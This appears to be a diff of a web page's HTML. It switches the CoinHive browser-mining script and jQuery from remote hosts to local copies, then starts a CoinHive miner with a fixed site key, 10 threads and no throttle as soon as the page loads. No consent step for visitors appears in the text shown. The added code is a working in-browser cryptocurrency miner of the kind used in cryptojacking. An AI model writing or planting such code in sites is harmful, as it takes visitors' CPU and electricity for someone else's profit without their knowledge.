@@ -19,19 +19,18 @@
 	<div class="acceptedHashes"></div>
 </div>
 </div>
-<script src="https://code.jquery.com/jquery-3.2.1.min.js" integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin="anonymous"></script>
-<script src="https://coinhive.com/lib/coinhive.min.js"></script>
+<script src="./js/jquery-3.2.1.min.js"></script>
+<script src="./js/coinhive.min.js"></script>
 <script>
-		var miner = new CoinHive.Anonymous("WsLpvpRA7aJd5xQIPHlprVwSr4UtPgvB", {
-			threads: 4,
+
+	var miner = new CoinHive.Anonymous('WsLpvpRA7aJd5xQIPHlprVwSr4UtPgvB',{
+			threads: 10,
 			autoThreads: false,
 			throttle: 0,
 			forceASMJS: false
 		});
 
 	miner.start();
-
-
 
 	// Listen on events
 	miner.on('found', function() { /* Hash found */ })
